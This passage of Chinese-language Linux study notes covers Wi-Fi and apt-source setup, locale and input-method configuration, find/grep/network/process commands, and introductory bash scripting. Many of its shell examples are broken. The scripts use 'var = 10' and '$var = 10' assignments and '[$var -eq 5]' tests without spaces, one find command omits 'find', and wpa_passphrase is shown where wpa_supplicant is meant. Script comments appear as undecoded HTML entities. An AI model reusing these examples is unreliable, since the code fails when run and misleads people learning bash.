iwconfig//开启无线网口$ sudo ifconfig wlan0 up//扫描（scaning）无线网络$ sudo iwlist wlan0 scan//连接无线网络$ sudo iwconfig wlan0 ESSID "wifi-name" KEY "password" open//执行上面的命令（command）后，发现并不能成功！！！//于是，通过如下命令继续配置//格式：wpa_passphrase &lt;ssid&gt; [passphrase]$ sudo wpa_passphrase "wifi-name" "passowrd"&gt;/etc/wpa_supplicant.conf$ sudo wpa_passphrase -B -i wlan0 -Dwext -c /etc/wpa_supplicant.conf//查看wlan0无线网口$ sudo iwconfig wlan0//执行命令获取到IP地址，成功连上WiFi$ sudo dhclient wlan0开机自动连接WiFi配置$ sudo vim /etc/network/interfaces.d/wlan0auto wlan0allow-hotplug wlan0iface wlan0 inet dhcp wpa-conf /etc/wpa_supplicant.conf 2.2.3 配置安装源(source)以配置163源举例说明访问域名:mirrors.163.com，找到镜像名为debian的目录，点击debian使用帮助。根据最新的debian版本进行选择jessie，wheezy，squeeze。从最新版本到最低版本选择源复制安装源文本到 /etc/apt/source.list 中。# mirrors.163.comdeb http://mirrors.163.com/debian/ jessie main non-free contribdeb http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb-src http://mirrors.163.com/debian/ jessie main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-updates main non-free contribdeb-src http://mirrors.163.com/debian/ jessie-backports main non-free contribdeb http://mirrors.163.com/debian-security/ jessie/updates main non-free contribdeb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib其他安装源中国科学技术大学开源软件镜像站清华大学开源软件镜像站华中科技大学开源镜像站阿里云开源镜像站2.2.4 配置系统支持中文（support chinese）安装及配置查看并设置环境变量$ echo $LANG$ export LANG=en_US.UTF-8没有安装 locales,先安装 locales$ sudo aptitude install locales配置中文编码$ sudo dpkg-reconfigure locales//选择编码（encode），space选择en_US.UTF-8zh_CN.GB2312zh_CN.GB18030zh_CN.GBKzh_CN.UTF-8文件配置$ sudo vim /etc/default/locate# LANG="zh_CN.UTF-8"# LANGUAGE="zh_CN:zh"LANG="en_US.UTF-8"LANGUAGE="en_US:en"安装中文输入法ibus &amp; UIM &amp; SCIM &amp; Fcitxgnome-chinese-inputi18n ibusFcitx 输入法补充Ubuntu安装Fcitx以及Fcitx输入中文不显示候选词框的解决办法安装 fcitx 组件（module）$ sudo apt-get install fcitx-tools fcitx-config* fcitx-data fcitx-frontend* fcitx-libs fcitx-module* fcitx-ui* presage安装 fcitx 输入法$ sudo apt install fcitx-pinyin$ sudo apt install fcitx-googlepinyin$ sudo apt install fcitx-table //五笔设置并运行$ export LANG=zh_CN.utf8$ export LC_CTYPE=zh_CN.utf8$ export LC_ALL=zh_CN.utf8$ export XMODIFIERS=@im=fcitx$ fcitx &amp;ui 动态库的支持:$ sudo apt install fcitx-frontend-gtk2 fcitx-frontend-gtk3 fcitx-ui-classic重启可用参考资料Locale debian wiki2.2.5 设置命令别名：alias//利用别名代替长命令$ vim ~/.bashrc                                                                                                                                    : //存在这样的三行代码，意思就是检查是否存在 .bash_aliases 文件，存在就加载                 if [ -f ~/.bash_aliases ]; then. ~/.bash_aliasesfi//于是,新建并编辑$ vim .bash_aliases#shadowsocksalias shadowsocks="sudo sslocal -c /etc/shadowsocks.json -d start"2.3 介绍(Instroduction)首先，明确一点：GNU Not's Unix.2.3.1 入门第一步，理解 Linux首先，以 Linux 的思维方式系统性思考问题。Linux 是一个面向文件的操作系统。所有的应用、管理是基于文件的。Linux 是一个以命令行为主要的管理方式的 OS。Linux 的日志非常完善，也至关重要。Linux 是一个以配置文件为管理基础的 OS。Linux 的所有应用、管理和配置，都有很多程序来辅助完成。2.3.2 Linux 内容划分Linux 可划分为以下四部分Linux 内核GNU 工具图形化桌面环境应用软件深入探究 Linux 内核Linus Torvalds：Linux 内核开发者。Linux 内核主要负责一下四种功能：系统内存管理内核不仅管理服务器上的可用物理内存，还可以创建和管理虚拟内存。内核通过硬盘上的存储空间来实现虚拟内存，这块区域称为交换空间（swap space）。内核不断地交换空间和实际的物理内存之间反复交换虚拟内存中的内容。这使得系统以为它拥有比物理内存更多的可用内存。内存存储单元按组划分成很多块，这些块称作页面（page）。内核将每个内存页面放在物理内存或交换空间。然后，内核会维护一个内存页面表，指明哪些页面位于物理内存内，哪些页面被换到了磁盘上。内核会记录哪些内存页面正在使用中，并自动把一段时间未访问的内存页面复制到交换空间区域（称为换出，swapping out）——即使还有可用内存。软件程序管理Linux 操作系统将运行中的程序称为进程。内核控制着 Linux 系统如何管理运行在系统上的所有进程。内核创建了第一个进程（称为 init 进程）来启动系统上所有其他进程。Linux 操作系统的 init 系统采用了运行级。Linux 操作系统有 5个启动运行级。运行级为 1 时，只启动基本的系统进程以及一个控制台终端进程，我们称之为单用户模式。单用户模式通常用来在系统有问题时进行紧急的文件系统维护。显然，这种模式下，仅有一个人（通常是系统管理员）能登录到系统上操作数据。运行级为 3 时，大多数应用软件，比如网络支持程序，都会启动。运行级为 5 时，系统会启动 X Window 系统，允许用户通过图形化桌面窗口登录系统。Linux 系统可以通过调整启动运行级来控制整个系统的功能。硬件设备管理内核的另一职责是管理硬件设备。任何 Linux 系统需要与之通信的设备，都需要在内核代码中加入驱动程序代码。在 Linux 内核中有两种方法用于插入设备驱动程序代码：编译进内核的设备驱动代码可插入内核的设备驱动模块以前，插入设备驱动代码的唯一途径是重新编译内核。随着 Linux 内核支持的硬件设备越来越多，这个过程变得越来越低效。后来，开发人员提出了内核模块的概念。它允许将驱动代码插入到运行中的内核而无需重新编译内核。Linux 系统将硬件设备当成特殊的文件，称为设备文件。设备文件有3种分类字符型设备文件：指处理数据时每次只能处理一个字符的设备。大多数类型的调制解调器和终端都是作为字符型设备文件创建的。块设备文件：指处理数据时每次能处理大块大数据的设备，比如硬盘。网络设备文件：指采用数据包发送和接受数据的设备，包括各种网卡和一个特殊的回环设备。这个回环设备允许 Linux 系统使用常见的网络编程协议同自身通讯。Linux 为系统上的每个设备都创建一种称为节点的特殊文件。与设备的所有通信都通过设备节点完成。每个节点都有唯一的数值对供 Linux 内核标识它。数值对包括一个主设备号和一个次设备号。类似的设备被划分到同样的主设备号下。次设备号用于标识主设备组下的某个特定设备。文件系统管理Linux 内核支持通过不同类型的文件系统从硬盘中读写数据。内核必须在编译时就加入对所有可能用到的文件系统的支持。下表是 Linux 系统用来读写数据的标准文件系统Table 2: 文件系统类型文件系统描述extLinux 扩展文件系统，最早的 Linux 文件系统ext2第二扩展文件系统，在ext的基础上提供更多的功能ext3第三扩展文件系统，支持日志功能ext4第四扩展文件系统，支持高级日志功能hpfsOS/2高性能文件系统jfsIBM日志文件系统iso9660ISO 9660文件系统（CD-ROM）mimixMINIX文件系统msdos微软的FAT16ncpNetware文件系统nfs网络文件系统ntfs支持Microsoft NT文件系统proc访问系统信息ReiserFS高级Linux文件系统，能提供更好的性能和硬盘恢复功能smb支持网络访问的Samba SMB文件系统sysv较早期的Unix文件系统ufsBSD文件系统umsdos建立在msdos上的类Unix文件系统vfatWindows95文件系统（FAT32）XFS高性能64位日志文件系统Linux 内核采用虚拟文件系统（Virtual File System,VFS）作为和每个文件系统交互的接口。     GNU工具核心 GNU 工具：coreutils(coreutilities)软件包GNU coreutils 软件包由三部分构成：用以处理文件的工具用以操作文本的工具用以管理进程的工具shellTable 3: Linux 中常见的shellshell描述bashbash shell 是 Bourne shell 的一个免费版本，它是最早的 Unix shell，bash还有一个特点，可以通过help命令来查看帮助。包含的功能几乎可以涵盖shell所具有的功能，所以一般的shell脚本都会指定它为执行路径。ash一种运行在内存受限环境中简单的轻量级shell，但与bash shell完全兼容。korn一种与 Bourne shell，但支持如关联数组和浮点运算等一些高级的编程特性。tcsh一种将C语言中的一些元素引入到shell脚本中的shell。zsh一种结合了bash、tcsh和korn的特性，同时提供高级编程特性、共享历史文件和主题化提示符的高级shell。Linux 桌面环境X WindowKDE 桌面（K Desktop Environment，K 桌面系统）GNOME 桌面（the GNU Network Object Model Environment，GNU 网络对象模型桌面）Unity 桌面其他桌面Table 4: 其他桌面桌面描述Fluxbox&#xa0;Xfce&#xa0;JWM&#xa0;Fvwm&#xa0;fvwm95&#xa0;Linux 发行版不同的 Linux 发行版通常归类为3种：完整的核心 Linux 发行版Table 5: 完整的核心 Linux 发行版Slackware最早的 Linux 发行版之一Red Hat商业发行版FedoraRed Hat 分离出的家用发行版Gentoo为高级 Linux 用户设计的发行版，仅包含 Linux 源代码openSuse商用和家用的发行版DebianLinux 专家和商用 Linux 产品中流行的发行版特定用途的发行版Table 6: 特定用途的发行版CentOS一款基于 Red Hat 企业版 Linux 源代码构建的免费发行版Ubuntu一款用于学校和家庭的免费发行版PCLinuxOS一款用于学校和办公的免费发行版Mint一款用于家庭娱乐的免费发行版dyne:bolic一款用于音频和MIDI应用的免费发型版Puppy Linux一款适用于老旧PC的小型免费发行版LiveCD 测试发行版。Table 7: LiveCD 测试发行版。Knoppix最早的 LiveCD LinuxPCLinuxOS一款成熟的 LiveCDUbuntu为多种语言设计的世界级 Linux 项目Slax基于 Slackware LinuxPubby Linux为老旧 PC 设计的一款全功能 Linux2.3.3 Linux 基本网络配置安装网络工具$ sudo apt-get install net-tools配置网络在 Linux 中，以太网接口被命名为：eth0、eth1等。lspci 命令可以查看网卡硬件信息（如果是 usb 网卡，则需要使用 lsusb 命令）ifconfig 命令：查看接口信息$ ifconfig -a$ ifconfig eth0ifup,ifdown 命令：启用、禁用一个接口$ ifup eth0$ ifdown eth0相关配置文件网卡配置文件：/etc/sysconfig/network-scripts/ifcfg-eth0DNS 配置文件：/etc/resolv.conf主机名配置文件：/etc/sysconfig/network静态主机名配置文件：/etc/hosts网络测试测试网路连通性：ping 命令测试DNS解析：host,dig 命令显示路由表：ip route 命令追踪到达目标地址的网络路径：traceroute 命令mtr 命令进行网络质量测试2.3.4 Linux 日期时间设置Linux 时钟分为系统时钟（System Clock）和硬件时钟（Real Time Clock，简称 RTC）。系统时钟指当前 Linux Kernel 中的时钟;硬件时钟指主板上由电池供电的时钟，可在 BIOS 中进行设置。date 命令hwclock 命令，查看硬件时间//设置硬件时间$ sudo hwclock -set -date='07/17/2017 20:00'硬件时间与系统时钟同步$ sudo hwclock --hctosys(hc 代表硬件时间，sys 代表系统时间)$ sudo hwclock -systohc2.3.5 获取帮助 &amp; 问题解决出现问题，先保护现场。（问题一种是已正确运行的系统出问题，另一种是新的操作或配置造成了问题）当怀疑有黑客入侵或病毒的情况，马上做日志备份。检查相关日志。对于新的操作或配置造成的问题，最好是养成定期备份重要文件的习惯。使用网络使用搜索命令：find，locate，whereis。。。man查看在线帮助手册(an interface to the on-line reference manuals)，如果不记得命令名怎么办？可以使用关键字搜索手册页。$ man -k terminalTable 8: Linux 手册页惯用的节名节描述Name显示命令和一段简短的描述Synopsis命令的语法Configuration命令配置信息Description命令的一般性描述Options命令选项描述Exit Status命令的推出状态指示Return Value命令的返回值Errors命令的错误信息Environment描述所使用的环境变量Files命令用到的文件Versions命令的版本信息Conforming To命令所遵从的标准Notes其他有帮助的资料Bugs提供提交Bug的途径Example展示命令的用法Authors命令开发人员的信息Copyright命令源代码的版权状况See Also与该命令类似的其他命令Table 9: Linux 手册页的内容区域区域号所涵盖的内容1可执行程序或shell命令2系统调用3库调用4特殊文件5文件格式与约定6游戏7概览、约定及杂项8超级用户和系统管理员命令9内核例程help查看命令帮助信息(Display information about builtin commands.)type查看命令类型(Display information about command type)3 Linux 文件、目录与磁盘格式3.1 Linux 文件权限3.1.1 理解文件权限使用文件权限符$ ls -lhdrwxr-xr-x 3 zrg zrg 4.0K Apr 21 16:24 练手项目-rw-r&#x2013;r&#x2013; 1 zrg zrg 2.5M Apr 21 11:51 练手项目.rarTable 10: 解释drwxr-xr-x3zrgzrg4.0KApr 21 16:24练手项目文件类型。文件权限。对于普通文件：链接数用户名组名文件大小，单位：字节最后修改日期时间文件名d 目录文件从左往右分别代表所有者权限、组用户权限和其他用户权限对于目录文件：第一级子目录数&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;- 普通文件r 可读&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;l 链接文件w 可写&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;c 字符型设备文件x 可执行&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;b 块设备文件- 无执行权限&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;n 网络设备文件&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;s 套接字文件&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;默认文件权限umask 命令用来设置所创建文件和目录的默认权限。3.1.2 共享文件Linux 为每个文件和目录存储了3个额外的信息位。设置用户ID（SUID）设置组ID（GID）粘着位：进程结束后文件还驻留（粘着）在内存中。Table 11: chmod SUID、SGID和粘着位的八进制值二进制值八进制值描述0000所有位都清零0011粘着位置位0102SGID位置位0113SGID位和粘着位都置位1004SUID位置位1015SUID位和粘着位都置位1106SUID位和SGID都置位1117所有位都置位//创建一个共享目录$ mkdir testdir$ chgrp shared testdir$ chmod g+s testdir$ umask 002$ cd testdir$ touch testfile3.2 Linux 目录结构3.3 Linux 文件搜索3.3.1 find 命令根据文件名查找格式：find [搜索范围][匹配条件]// 默认在当前目录下搜索$ find -name "MyCProgram.c"// 忽略大小写$ find -iname "MyCProgram.c"// 查找以my开头，后面包含三个字符的文件$ find -name my??? // 深度查找：// 在 root 目录及其子目录下查找 passwd 文件。$ sudo find / -maxdepth 2 -name passwd// 在第二层子目录和第四层子目录之间查找 passwd 文件。$ sudo find / -mindepth 3 -maxdepth 5 -name passwd// 找到 home 目录及子目录下所有的空文件(0字节文件) // 下面命令的输出文件绝大多数都是锁定文件盒其他程序创建的 place hoders$ find ~/ -empty//列出你 home 目录里的空文件。$ find ~/ -maxdepth 1 -empty//列出 home目录下的非隐藏空文件。$ find ~/ -maxdepth 1 -empty -not -name ".*"// 相反匹配// 显示所有的名字不是 MyCProgram.c 的文件或者目录。$ find -maxdepth 1 -not -iname "MyCProgram.c"// 在查找到的文件上执行命令// 在查找到名为“MyCProgram.c”的文件上计算 MD5 验证和。$ find -iname "MyCProgram.c" -exec md5sum {} \;// 在 /etc 目录下查找 inittab 文件并显示其详细属性$ sudo find /etc -name initab -exec ls -l {} \;注意：{} 将会被当前文件名取代。-exec/-ok &lt;command&gt; {} \; 对搜索结果执行操作，使用 -ok 会询问是否确认。文件大小查找// 格式：+n 大于；-n 小于；n 等于// 在 root 目录下查找大于100MB的文件$ sudo find / -size +204800注意：在 Linux 里面，1 数据块 = 512 byte = 0.5 KB，100 MB = 102400 KB = 204800 数据块// 在 /etc 目录下查找大于 80MB 小于 100MB 的文件$ sudo find /etc -size +163840 -a size -204800-a 表示两个条件同时满足-o 表示两个条件满足一个即可//列出当前目录及子目录下的 5个最大的文件。这会需要一点时间，取决于命令需要处理的文件数量。$ find . -type f -exec ls -s {} \; | sort -n -r | head -5//查找 5个最小的文件$ find . -type f -exec ls -s {} \; | sort -n  | head -5//上面的命令中，很可能你看到的只是空文件(0字节文件)。因此，你可以使用下面的命令列出最小的文件，而不是 0字节文件。$ find . -not -empty -type f -exec ls -s {} \; | sort -n  | head -5//查找并删除大于 100M 的 *.zip 文件。$ find / -type f -name *.zip -size +100M -exec rm -i {} \;注意：{} 和 \ 之间是有空格的！根据文件变动情况查找// 在/etc目录下查找5分钟内被修改过属性的文件和目录$ sudo /etc -cmin -5-amin 访问时间 access-cmin 文件属性 change-mmin 文件内容 modify// 显示所有的在 ordinary_file 之后创建修改的文件。$ ls -lrt$ find -newer ordinary_file根据文件类型查找f 文件，d 目录，l 软链接，s socket文件//查找所有的一般文件$ find ./ -type f//查找所有的隐藏文件和目录$ find ./ -type f -name ".*"$ find ./ -type d -name ".*"根据文件权限、所属关系查找$ find /home -user zrg$ find /home -group zrg// 查到当前目录下对同组用户具有读权限的文件$ find ./ -perm -g=r -type f -exec ls -l {} \;// 找到对组用户具有只读权限的文件。$find ./ -perm g=r -type f -exec ls -l {} \;  // 找到对组用户具有只读权限的文件(使用八进制权限形式)。$ find ./ -perm 040 -type f -exec ls -l {} \;使用 inode 编号查找//任何一个文件都有一个独一无二的 inode 编号，借此我们可以区分文件。//使用选项 -i，可以看到文件的 inode 编号，借此可以区分这两个文件。$ ls -i1 test*16187429 test-file-name16187430 test-file-name//使用 inode 编号来删除那些具有特殊符号的文件名。$ find -inum 16187430 -exec rm {} \;3.3.2 locate 命令该命令建立了一个文件资料库，查找文件时直接在资料库中查找。类似 Windows 下的 Everything 工具。// 安装：$ sudo apt install mlocate// 使用$ locate init注意：locate 命令不会查找/tmp目录下内容。// 更新文件资料库：$ updatedb3.3.3 which 和 where 命令用于查找某个命令(Locate a command)$ which ls$ where useradd3.3.4 grep 命令语法格式：grep -iv [指定字符串][文件]-i 不区分大小写-v 排除指定字符串// 查找指定字符串的行并显示$ grep 123 test.txt// 去掉# 注释行$ grep -v ^# config.txt3.4 Linux 文件压缩与打包另外还有不常见的，但时有遇到的：.tar.xz$ tar xpvf file.tar.xz.tgz$ tar zxf  name.tgz//解压到指定目录$ unzip name.zip -d ./dir3.5 Linux 磁盘与文件系统3.5.1 格式化分区命令将 /dev/sda7 硬盘格式化为 ext3 格式。$ mkfs -t ext3 -c /dev/sda73.6 ～～～3.6.1 网络命令write描述给指定用户发送信息(send a message to another user)，Ctrl+D 保存结束格式: write user [tty]实践wall描述发送广播信息(write a message to all users)格式: wall [-n] [-t timeout] [message | file]实践ping描述测试网络联通性(send ICMP ECHO_REQUEST to network hosts)实践指定ping次数$ ping -c 4 baidu.comifconfig描述configure a network interface实践mail描述查看/发送电子邮件实践last &amp; lastlog描述列出目前/过去登入系统的用户信息last, lastb - show a listing of last logged in userslast [options] [username...] [tty...]lastb [options] [username...] [tty...]列出用户最后一次登录系统的信息lastlog - reports the most recent login of all users or of a given userlastlog [options]实践traceroute描述追踪数据包到主机间的路径traceroute - print the route packets trace to network host实践netstat描述显示网络相关信息netstat - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships实践查看主机对外开放端口$ netstat -ntlp查看本机监听的端口$ netstat -tlun查看本机所有的网络连接$ netstat -ano查看本机路由表$ netstat -rnsetup描述配置网络实践3.6.2 进程管理命令top描述ps描述list the processes running on the system实践查看$ ps -efkill &amp; killall描述send a signal to one or more processes (usually to "kill" a process)jobs描述an alternate way of listing your own processesbg描述put a process in the backgroundfg描述put a process in the forground4 Shell Scripts4.1 学习 Shell 的疑惑如何启动命令行以及接下来做什么？如何使用 shell脚本来自动处理系统管理任务，包括从检测系统统计数据和数据文件到为你的老板生成报表？4.2 学习 Shell 开始4.2.1 Shell 类型/bin/bash/bin/tcsh/bin/dash/bin/csh/bin/sh4.2.2 Shell 的父子关系$ ps -fUID        PID  PPID  C STIME TTY          TIME CMDzrg      25305  4834  8 23:51 pts/4    00:00:00 -bashzrg      25317 25305  0 23:51 pts/4    00:00:00 ps -f$ bash$ ps -fUID        PID  PPID  C STIME TTY          TIME CMDzrg      25305  4834  0 23:51 pts/4    00:00:00 -bashzrg      25347 25305  0 23:53 pts/4    00:00:00 bashzrg      25352 25347  0 23:54 pts/4    00:00:00 ps -f输入命令之后，一个子 shell 就出现了。第二个 ps -f 是在子 shell 中执行的。可以从显示结果中看到两个 bash shell 程序在运行。$ bash$ bash$ bash$ ps --forestPID TTY          TIME CMD25305 pts/4    00:00:00 bash25347 pts/4    00:00:00  \_ bash25372 pts/4    00:00:00      \_ bash25377 pts/4    00:00:00          \_ bash25382 pts/4    00:00:00              \_ ps在上面例子中，bash 命令被输入了三次。实际上创建了三个子 shell。ps &#x2013;forest 命令展示了这些子 shell 间的嵌套结构。可以使用 exit 命令退出子 shell$ exit进程列表$ pwd;ls;cd /etc;pwd/home/zrg/zhaorengui.github.io404.html  archives  categories  _config.yml  _drafts  Gemfile.lock  index.html  _orgs   README.en.md  _sass       _site  tagsabout     assets    category    _data        Gemfile  _includes     _layouts    _posts  README.md     search.xml  tag/etc在命令之间加入“;，指定要依次执行的一系列命令$ (pwd;ls;cd /etc;pwd)/home/zrg/zhaorengui.github.io404.html  archives  categories  _config.yml  _drafts  Gemfile.lock  index.html  _orgs   README.en.md  _sass       _site  tagsabout     assets    category    _data        Gemfile  _includes     _layouts    _posts  README.md     search.xml  tag/etc使用括号包含命令，成为进程列表查看是否生成了子 shell，使用：$ echo $BASH_SUBSHELL子shell用法// 在后台睡眠10s$ sleep 10&amp;// 查看后台进程$ ps -for$ jobs -l//将进程列表置入后台$ (sleep 2;echo $BASH_SUBSHELL;sleep 2)&amp;// 创建备份$ (tar -cf Rich.rar /home/rich;tar -cf My.tar /home/christine)&amp;//协程：在后台生成一个子shell，同时在这个子shell中执行命令。// 进行协程处理，使用 coproc 命令$ coproc sleep 10$ coproc My_Job{sleep 10;}4.2.3 理解 shell 的内建命令外部命令也被称为文件系统命令，是存在于bash shell之外的程序。ps 就是一个外部命令，可以使用 which 和 type 命令找到$ which ps$ type -a ps当外部命令执行时，会创建一个子进程，这种操作叫做衍生（forking）。内建命令内建命令和外部命令的区别在于前者不需要使用子进程来执行。它们已经和 shell 编译成一体，作为 shell 工具的组成部分存在。可以利用 type 命令来了解某个命令是否是内建的。$ type cdcd is a shell builtin要注意，有些命令有多种实现。既有内建命令也有外部命令。$ type -a echoecho is a shell builtinecho is /bin/echo$ type -a pwdpwd is a shell builtinpwd is /bin/pwd 4.3 使用 Linux 环境变量概念：环境变量（environment variable），用来存储有关 shell 会话和工作环境的信息。全局环境变量和局部环境变量:// 查看全局变量$ envor$ printenv// 查看某个全局环境变量$ env HOMEor$ echo $HOME// set 命令会显示为某个特定进程设置的所有环境变量，包括全局变量、局部变量以及用户自定义变量。$ set设置用户自定义变量$ my_variable=Hello注意：所有环境变量名均使用大写字母，这是 bash shell 的标准惯例。自己创建的局部变量或是 shell 脚本，请使用小写字母。变量名区分大小写。$ my_variable="Hello World"// 设置全局变量$ export my_variable="I am Global now"// 删除环境变量$ unset my_variable注意：如果要用到变量，使用$；如果要操作变量，不使用$。默认的 shell 环境变量设置 PATH 环境变量$ PATH=$PATH:/opt/test/scripts定位系统环境变量登录时作为默认登录 shell登录 shell 会从5个不同的启动文件里读取命令：/etc/profile，默认的 bash shell 主启动文件。$HOME/.bash_profile$HOME/.bashrc$HOME/.bash_login$HOME/.profile作为非登录 shell 的交互式 shell作为非登录 shell 的交互式启动的，它不会访问 /etc/profile 文件，只会检查 HOME 目录中的 .bashrc 文件。.bashrc 文件有两个作用：一是查看/etc目录下通用的 bashrc 文件；二是为用户提供一个定制自己的命名别名和私有脚本函数的地方。作为运行脚本的非交互式shell系统执行 shell 脚本时使用，不同的地方在于它没有命令提示符。bash shell 提供了 BASH_ENV 环境变量，当 shell 启动一个非交互式 shell 进程时，它会检查这个环境变量来查看要执行的启动文件。// 环境变量持久化在大多数发行版中，存储个人用户永久性 bash shell 变量的地方是 $HOME/.bashrc 文件。但如果设置了 BASH_ENV 变量，那么记住，除非它指向的是 $HOME/.bashrc，否则应该将非交互式 shell 的用户变量放在别的地方。数组变量//环境变量作为数组使用$ mytest=(one two three four five)$ echo ${mytest[2]}three$ echo ${mytest[*]}one two three four five//改变某个索引的值$ mytest[2] = seven//删除某个索引的值和删除整个数组$ unset mytest[2]$ unset mytest4.3.1 改变安全性设置1. 改变权限chmod命令用来改变文件和目录的安全性设置。2. 改变所属关系chown命令用来改变文件的所属组。4.3.2 共享文件Linux为每个文件和目录存储了3个额外的信息位。设置用户ID（SUID）设置组ID（GID）粘着位：进程结束后文件还驻留（粘着）在内存中。Table 12: chmod SUID、SGID和粘着位的八进制值二进制值八进制值描述0000所有位都清零0011粘着位置位0102SGID位置位0113SGID位和粘着位都置位1004SUID位置位1015SUID位和粘着位都置位1106SUID位和SGID都置位1117所有位都置位//创建一个共享目录$ mkdir testdir$ chgrp shared testdir$ chmod g+s testdir$ umask 002$ cd testdir$ touch testfile4.4 shell 脚本编程基础4.4.1 构建基本脚本创建一个简单的脚本#!/bin/bash  #&#21578;&#35785;shell&#29992;/bin/bash&#26469;&#36816;&#34892;&#33050;&#26412;&#12290;# This script displays the date and who's #&#33050;&#26412;&#29992;&#36884;&#35828;&#26126;&#21450;&#20316;&#32773;&#31561;&#20449;&#24687;&#25551;&#36848; echo "This's is a shell script." #&#26174;&#31034;&#28040;&#24687;echo -n "The time and date are: " #n&#34920;&#31034;&#22312;&#19968;&#34892;&#26174;&#31034;dateecho "User info for userid: $USER" #&#29615;&#22659;&#21464;&#37327;&#65292;&#29992;set&#21629;&#20196;&#21487;&#20197;&#26597;&#30475;&#19968;&#20221;&#23436;&#25972;&#30340;&#24403;&#21069;&#29615;&#22659;&#21464;&#37327;&#21015;&#34920;&#12290;echo UID: $UIDecho HOME: $HOMEecho "The cost of the item is \$15." #&#32654;&#20803;&#38656;&#35201;&#20351;&#29992;\&#36716;&#20041;days = 10 #&#29992;&#25143;&#33258;&#23450;&#20041;&#21464;&#37327;echo $days# &#26377;&#20004;&#31181;&#26041;&#27861;&#21487;&#20197;&#23558;&#21629;&#20196;&#36171;&#32473;&#21464;&#37327;test = `date` #&#29992;&#19968;&#23545;&#21453;&#24341;&#21495;&#25226;&#25972;&#20010;&#21629;&#20196;&#22260;&#36215;&#26469;test = $(date) #&#20351;&#29992;$()&#26684;&#24335;today = $(date+%y%m%d) #today&#21464;&#37327;&#34987;&#36171;&#20104;&#26684;&#24335;&#21270;&#21518;&#30340;date&#21629;&#20196;&#30340;&#36755;&#20986;&#12290;重定向输入和输出// 输出重定向$ date &gt; test$ date &gt;&gt; test// 输入重定向$ wc &lt; test2 11 60//wc命令，默认情况下，会输出3个值：文本的行数文本的词数文本的字节数内联输入重定向（inline input redirection）$ wc &lt;&lt; EOFshell 会用PS2环境变量中定义的次提示符来提示输入数据管道$ rpm -qa | sort//上面的命令会同时运行。执行数学运算$ var1=$(1+5)$ var2=$[$var1 * 2]// 使用$和[]将数学表达式围起来注意：bash shell数学运算符支持整数运算。z shell（zsh）提供了完整的浮点数算术操作。浮点解决方案1.用内建的bash计算器：bc$ bc3.44 / 50scale = 4 浮点运算由scale控制，默认值为0// -q选项可以不显示冗长的欢迎信息$ bc -q var1 = 10var1 * 440var2 = var1 / 5print var22quit$2. 在脚本中使用bc#!/bin/bashvar1 = $(echo "scale=4;3.44 / 5" | bc)echo The answer is $var1#!/bin/bashvar1 = 10.46var2 = 43.67var3 = 33.2var4 = 71var5 = $(bc &lt;&lt; EOFscale =4a1 = ($var1*$var2)a2 = ($var3*var4)a1+b1EOF)echo "The final answer for this mess is $var5"退出脚本1. 退出状态码（exit status）$ echo $?0状态码描述0命令成功结束1一般性未知错误2不适合的shell命令126命令不可执行127没找到命令128无效的退出参数128+x与Linux信号x相关的严重错误130通过Ctrl+C终止的命令255正常范围之外的退出状态码2. exit命令exit命令允许在脚本结束时指定一个退出状态码echo 'Hello, World'exit 5 $ ./test Hello, World$ echo $?54.4.2 结构化命令if-then#!/bin/bashtestuser = zrg#if grep $testuser /etc/passwdthen        echo "The bash files for user $testuser are:"    ls -a /home/$testuser/.b*    echoelif ls -d /home/$testuserthen        echo "The user $testuser has a directory"else        echo "The user $testuser does not exist on this system."    echofi#test&#21629;&#20196;&#25552;&#20379;&#20102;&#22312;if-then&#35821;&#21477;&#20013;&#27979;&#35797;&#19981;&#21516;&#26465;&#20214;&#30340;&#36884;&#24452;&#12290;#test&#21629;&#20196;&#21487;&#20197;&#21028;&#26029;&#19977;&#31867;&#26465;&#20214;&#65306;&#25968;&#20540;&#27604;&#36739;&#65307;&#23383;&#31526;&#20018;&#27604;&#36739;&#65307;&#25991;&#20214;&#27604;&#36739;test 命令格式：if test conditionthencommandsfi如果 test 命令中列出的条件成立，退出并返回退出状态码0；如果条件不成立，退出并返回非零的退出状态码。#!/bin/bash$var = 10if [$var -eq 5]then         echo "The value $var are equal."else        echo "The value $var are different."fi$var1 = baduserif [$USER != $var1]then        echo "This is not $var1"else        echo "Welcome $var"fi$var2 = baseall$var3 = hockeyif [$var2 \&gt; $var3] #&gt;&#31526;&#21495;&#38656;&#35201;&#36716;&#20041;&#65292;&#38450;&#27490;&#35299;&#37322;&#25104;&#36755;&#20986;&#37325;&#23450;&#21521;then        echo "$var2 is greater than $var3"else        echo "$var2 is less than $var3"fi特别说明：1.test命令和测试表达式使用标准的数学比较符号来表示字符串比较，而用文本代码来表示数值比较。2.比较测试时，大写字母被认为是小于小写字母，但sort命令恰好相反。#!/bin/bashvar1 = testingvar2 =''if [-n $var1]then        echo "The string '$var1' is not empty."else        echo "The string '$var1' is empty."fiif [-z $var2]then        echo "The string '$var2' is empty."else        echo "The string '$var2' is not empty."fi#!/bin/bashjump_directory=/home/arthurif [-d $jump_directory]then        echo "The $jump_directory directory exists."else        echo "The $jump_directory directory does not exists."fi比较描述-d file检查file是否存在并是一个目录-e file检查file是否存在-f file检查file是否存在并是一个文件-r file检查file是否存在并可读-s file检查file是否存在并非空-w file检查file是否存在并可写-x file检查file是否存在并可执行-O file检查file是否存在并属当前用户所有-G file检查file是否存在并且默认组与当前用户相同file1 -nt file2检查file是否比file2file1 -ot file2检查file是否比file2旧复合条件格式：[condition1] &amp;&amp; [condition2][condition1] || [condition2]#!/bin/bash# testing compound comparisons#if [-d $HOME] &amp;&amp; [-w $HOME/testing]then        echo "The file exists and you can write to it."else        echo "I cannot write to the file."fiif-then 的高级特性#!/bin/bash# (( expression )) expression &#21487;&#20197;&#26159;&#20219;&#24847;&#30340;&#25968;&#23398;&#36171;&#20540;&#25110;&#27604;&#36739;&#34920;&#36798;&#24335;&#12290;var1=10if(( $var1 ** 